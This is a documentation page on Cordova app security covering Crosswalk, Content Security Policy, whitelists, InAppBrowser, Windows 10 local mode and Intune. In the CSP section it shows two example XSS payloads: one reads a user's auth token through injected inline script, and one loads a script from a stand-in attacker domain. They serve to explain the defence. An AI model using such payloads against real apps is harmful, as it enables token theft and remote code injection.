<properties pageTitle="Understand Cordova platform security"
  description="Cordova platform and app security"
  services=""
  documentationCenter=""
  authors="clantz" />

#Cordova platform security features
Security is a very broad topic that covers a number of different aspects of an app's lifecycle. Securing an app often represents a number of tradeoffs and key decisions. Like the web, Cordova is a very open platform and as a result it does not force you down a specific path that will always guarantee a secure app. Instead provides a set of tools that you can use to lock down your app as appropriate. A forced lockdown approach can block critical scenarios and thus tends to have undesired results.

For the most part you should apply the same [best practices to your code as you do for web apps](https://code.google.com/archive/p/browsersec/wikis/Main.wiki). However, given the increased capabilities Cordova apps are afforded, it is important to limit your risk as much as possible. This document will outline some of the security features that exist in Cordova and some general best practices for improving the overall security of your app beyond what you may typically think about for web apps. 

## Update Cordova
While always a good recommendation, staying up to date with Cordova versions is a best practice as security fixes are included on a regular basis. You should absolutely not use Cordova versions < 4.3.1 as your app will be rejected from Google Play due to a [specific security issue](../tips-and-workarounds/android/security-05-26-2015.md). Further, you should do everything you can to use **Apache Cordova 5 and up** as this version provide some critical capabilities that can improve the overall security of your app. Specifically:

1. **The Crosswalk Webview** - The Android platform in Cordova 5 and up (cordova-android 4.0.0+) introduced the ability to support "pluggable webviews" where the app itself contains a consistent webview implementation rather than the default browser on the device. Originally conceived as a way to get more consistent behavior on Android, one implementation is the [Crosswalk Webview](https://crosswalk-project.org/) which adds an up to date version of the Chromium webview to the project. For security, this means you get access to important security features like the Content Security Policy and Web Crypto on Android as far back as Android 4.0. Further, these devices will also get WebView related security patches not present in the OS itself. 
2. **Content Security Policy (CSP) Support**: Android with Crosswalk, iOS, and Windows 10 all support adding a Content Security Policy to your app and this represents an important security tool to take advantage of for any app. A strict policy can eliminate security attack vectors at the underlying webview/browser level. 
3. **Windows 10 Support w/CSP and "Local Mode" Support:** Windows 10 features a more nuanced view of security than Windows/Phone 8.1 did with significant improvements in compatibility between Android and iOS by default. In addition to CSP support, Windows 10 supports something called "local mode" that adds OS level security measures and allows additional native Windows 10 features to be used from within your Cordova app. These restrictions are more permissive and nuanced than those that were present in Windows 8.1 and but are off by default in Cordova apps to avoid cross-platform compatibility issues.

Read on for some additional guidance and recommendations  and see the **[Apache Cordova Security Guide](https://cordova.apache.org/docs/en/6.0.0/guide/appdev/security/index.html)** on Apache's site for additional tips.

##Use Crosswalk and Cordova 5+
As outlined above, Cordova 5 and the Crosswalk WebView can significantly improve the security of your app on Android particularly given the device fragmentation issues that exist today. Simply adding "cordova-plugin-crosswalk-webview" to your project when using Cordova 5+ enables these features. To add it to your project:

1. In Visual Studio, simply click "Add" on the **Crosswalk Webview Engine** plugin in the **config.xml designer.**
2. When using the command line or Visual Studio Code, you can add the plugin using the Cordova CLI as follows:

    ```
    cordova plugin add cordova-plugin-crosswalk-webview --save
    ```

There are, however, some nuances to using the Crosswalk webveiw given it does slow down build times and requires GPU acceleration in emulators. See **[improving Android browser consistency and features with the Crosswalk WebView](../develop-apps/cordova-crosswalk.md)** for setup details and information on the useful **Shared Mode**.

Note that Crosswalk 14 can cause a crash when using Web Crypto and Crosswalk 16 has caused crashes in certain emulators. Crosswalk 15 appears to be a solid choice. If you run into unexpected crashes or odd behaviors, simply the following config.xml to force the plugin to use version 15 (Right-Click &gt; View Code in VS):

```
<preference name="xwalkVersion" value="org.xwalk:xwalk_core_library:15+" />
```

You should only add this preference if you encounter issues as it disables useful features like "Shared Mode".

##Use a strict Content Security Policy
By default, simply adding a CSP declaration to an HTML page locks it down very tightly. By default, applying a CSP **disables both eval() and inline script** and only allows access to JavaScript and CSS files from the **same origin as the HTML page**. Typically for Cordova apps this means only **local content** and as a result, CDN hosted content typically cannot be referenced.  Breaking these down in terms of risk:

1. **Inline script** for JavaScript content, though extremely handy for testing and development, is one of the largest risks for attacks. When inline script is allowed, all it takes is one unescaped input pumped to innerHTML to allow a user to run any arbitrary JavaScript code. Note the inline script restriction also applies to **onload** and similar HTML attributes for the exact same reason. For example, imagine textInput in this code game from an input element in HTML:
    ```javascript
    // This is bad
    textInput = "<div id='hack-otuput'></div><script>document.getElementById('hack-output').innerText = app.user.authtoken;</script>"
    document.getElementById("output-div").innerHTML = textInput;
    ```

2. Allowing **JavaScript and CSS content from different origins** poses the next largest risk. Disabling inline script reduces the chances of attack, but even with inline script disabled you can still add a script tag with a href to an external source. The same innerHTML mistake can then lead to a similar vulnerability. While this is obviously true for JavaScript, CSS also poses a risk because directives like expression() and url('javascript:...'). You can loosen this restriction by listing only very specific domains that you trust but exercise caution when doing so. Tweaking the previous example slightly we get:
    ```javascript
    // This is also bad
    textInput = "<div id='hack-otuput'></div><script src='http://iliketohackthings.com/mybadscript.js'></script>"
    document.getElementById("output-div").innerHTML = textInput;
    ```
3. **eval()** along with related features like "new Function" also pose a risk but these are reduced if the inline and same origin restrictions are left in place. Further, eval is used by a number of JavaScript frameworks for optimization purposes so while this is the default it can become quite problematic if left in place. If your app and all associated frameworks do not make use of eval, you should disable it. Otherwise avoid using eval in your own code unless you really know exactly what you are doing.

Note that none of these rules apply to images or other static content. 

The default CSP policy in Visual Studio and Cordova templates is a solid starting point. It allows eval(), but keeps the inline script and same origin restrictions in place.

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *">
```

See the **[Cordova whitelist and Content Security Policy guide](./cordova-security-whitelist.md)** for additional details on configuring a CSP policy to meet your needs.

##Manage your whitelists
When using Cordova 5+, you will need to install a whitelist plugin to enable access to external network resources on Android. iOS and Windows 10 also supports the features in the whitelist plugin but as of 6.0.0 they are provided by the iOS platform itself. Regardless, the new whitelist plugin that is pre-installed in new Cordova projects either created from the CLI or Visual Studio actually introduce three separate elements designed to enable more discrete control that was possible in the past.

The **access** element from previous versions of Cordova returns but only controls where your app can make XHR requests or access other external content from a web page for Android and iOS. It no longer controls whether you can navigate to a different domain (such as hosted content). A new **allow-navigation** element has been added that then enables you to specify where the app can navigate instead. Finally, a new **allow-intent** element has been introduced specifically designed to control Android intents.

The base Visual Studio and [Cordova CLI](http://aka.ms/cordova-cli) template (via the cordova create command) has a config.xml file in it that is designed to allow the app to make external requests anywhere, allows a specific subset of intents, and prevents the WebView in the Cordova app to navigate anywhere other than local content.

```
<access origin="*" />
<allow-intent href="http://*/*" />
<allow-intent href="https://*/*" />
<allow-intent href="tel:*" />
<allow-intent href="sms:*" />
<allow-intent href="mailto:*" />
<allow-intent href="geo:*" />
```

This is a relatively safe starting point. To modify this list you can edit config.xml either in your favorite text editor like VS Code or by right-clicking and selecting View Source in Visual Studio. 

In general it is best to trim access down to only those URIs you actually need to use in your app and you will want to exercise great care when broadening access for your app to only include trusted sources.

Note that there are some nuances on how these whitelist work and both Windows Phone 8.0 and Windows / Windows Phone 8.1 do not support all of these elements. See the **[Cordova whitelist and Content Security Policy guide](./cordova-security-whitelist.md)** for additional details.

##When in doubt, InAppBrowser
If you must include content from an external source that you do not have complete and total control over, **use the InAppBrowser plugin** and host the content there. This plugin places content in a separate webview without access to Cordova interfaces and therefore significantly reduces the risk to your app and its data. It's easy to setup and replaces **window.open** with a secure implementation.

1. In Visual Studio, simply click "Add" on the **InAppBrowser** plugin in the **config.xml designer.**
2. When using the command line or Visual Studio Code, you can add the plugin using the Cordova CLI as follows:

    ```
    cordova plugin add cordova-plugin-inappbrowser
    ```

You can now open pages not in the allow-navigation whitelist in a sandboxed webview using the simple window.open command.
```javascript
window.open("http://www.bing.com", "_self");
```

##Use "Local Mode" for Windows 10
Windows 10 support in the Cordova Windows platform improves resolves many of the differences that existed between the Windows 8.0/8.1 platform and Android and iOS. In addition, it includes a "local mode" only allows navigation to pages hosed within the app, disables inline script, and only allows JavaScript and CSS references from within the app. The end result is a significant reduction in cross-site scripting risks since this is enforced at a platform level.

One often missed feature that the Windows platform for Cordova has is the ability to call any JavaScript enabled [Windows API](https://msdn.microsoft.com/en-us/library/windows/apps/br211377.aspx) from your Cordova app without a plugin. Many plugins for the Windows platforms are simple JavaScript adapters to conform to the plugin interface spec. Putting the app in "local mode" reduces risk given the number of APIs your app has access to by enforcing a base set of CSP rules at a OS level rather than relying exclusively on a CSP meta tag.

As a result, the store submission process for the Windows Store does reject apps using certain "capabilities" though these are not in use in core Cordova plugins. These restrictions are lifted completely in local mode allowing you full access to Windows APIs.

Enabling it is simple. Edit config.xml either in your favorite text editor like VS Code or by right-clicking and selecting View Source in Visual Studio and add the following elements:

```
<preference name="windows-target-version" value="10.0" />
<preference name="WindowsDefaultUriPrefix" value="ms-appx://" />
```

The WindowsDefaultUriPrefix preference flips Cordova into "local mode" instead of the default "remote mode." 

See the **[Cordova Windows 10 platform documentation](http://cordova.apache.org/docs/en/latest/guide/platforms/win8/win10-support.html)** for additional details on the difference along with the additional capabilities that are enabled when submitting to the public Windows Store.

##Use the Intune App SDK
[Microsoft Intune](https://www.microsoft.com/en-us/server-cloud/products/microsoft-intune/) is a [mobile application management](https://en.wikipedia.org/wiki/Mobile_application_management) (MAM) and [mobile device management]((https://en.wikipedia.org/wiki/Mobile_device_management) (MDM) platform that supports Android, iOS, and Windows devices. Intune's MAM capabilities can be used without managing devices which means it can be used in combination with existing MDM solutions like Airwatch and Mobile Iron. Currently it is targeted at Active Directory authorized apps and thus is most applicable to enterprise focused scenarios. It provides the ability to enforce policies at the **app level** including encryption of all local data, disabling cut-copy-paste, and more. A Cordova plugin for Android and iOS that is a part of Intune's App SDK enables more nuanced control that is typically availalbe from other MAM solutions. As a result it fundamentally improves the security of Cordova as an overall platform.

Intune provides two solutions for enabling its MAM features for Android and iOS devices: an app wrapping tool and an app SDK. The app wrapping tool that can be run on any Android or iOS app to light up certain capabilities like limiting cut-copy-paste while the app is running, forcing a PIN, or forcing encryption. The Intune App SDK takes this a step farther adds in multi-tenet encryption that goes beyond OS level data protection features and ensures data separation when multiple users access the same device. See [Microsoft Intune documentation](https://technet.microsoft.com/en-us/library/mt631425.aspx) for a comparison of the features provided by the app wrapping tool and the App SDK.

The app wrapping tool is generally available. While the Android and iOS native App SDKs are generally available, the Intune App SDK Cordova plugin that uses them is [currently in beta](https://blogs.msdn.microsoft.com/visualstudio/2015/11/18/announcing-the-intune-app-sdk/). If you are interested in the beta plugin, see the **[announcement blog post](https://blogs.msdn.microsoft.com/visualstudio/2015/11/18/announcing-the-intune-app-sdk/)** for more details getting access and stay tuned for the upcoming GA announcement. Otherwise see the Intune documentation on the **[Android](https://technet.microsoft.com/en-us/library/mt147413.aspx)** and **[iOS](https://technet.microsoft.com/en-us/library/dn878028.aspx) app wrapping tools** for more information.

##Additional Security Topics
- [Encrypt your local app data](./cordova-security-data.md)
- [Learn about securely transmitting data](./cordova-security-xmit.md)
- [Authenticate users with Azure Mobile Apps or the Active Directory Authentication Library for Cordova](./cordova-security-auth.md)
- [Detect potential security threats](./cordova-security-detect.md)
- [Quickly remediate security issues](./cordova-security-fix.md)